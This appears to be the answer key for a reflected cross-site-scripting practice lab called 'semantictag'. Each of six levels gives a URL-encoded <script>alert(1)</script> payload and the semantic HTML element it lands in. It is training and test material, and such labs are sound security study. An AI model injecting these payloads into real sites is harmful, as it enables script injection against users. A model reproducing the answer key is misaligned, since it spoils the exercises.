# semantictag — solutions

Plain HTML-body reflections inside semantic block elements (article, section, aside, nav, footer, main/blockquote). No filtering.

### semantictag-level1

`/semantictag/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<article><p>...</p></article>`

### semantictag-level2

`/semantictag/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<section><h2>...</h2></section>`

### semantictag-level3

`/semantictag/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<aside>...</aside>`

### semantictag-level4

`/semantictag/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<nav><a href="#">...</a></nav>`

### semantictag-level5

`/semantictag/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<footer>...</footer>`

### semantictag-level6

`/semantictag/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: inside `<main><blockquote>...</blockquote></main>`
